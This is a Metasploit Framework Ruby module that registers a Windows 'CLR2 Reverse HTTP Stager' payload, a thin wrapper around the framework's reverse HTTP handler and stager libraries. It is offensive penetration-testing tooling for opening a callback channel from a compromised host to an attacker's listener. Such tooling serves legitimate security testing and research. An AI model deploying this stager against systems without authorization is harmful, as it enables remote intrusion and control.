##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_http'
require 'msf/core/payload/clr2/reverse_http'

module MetasploitModule

  CachedSize = 414

  include Msf::Payload::Stager
  include Msf::Payload::Clr2::ReverseHttp

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'CLR2 Reverse HTTP Stager',
      'Description' => 'Tunnel communication over HTTP (CLR2)',
      'Author'      => ['OJ Reeves'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_CLR2,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'http'
    ))
  end
end
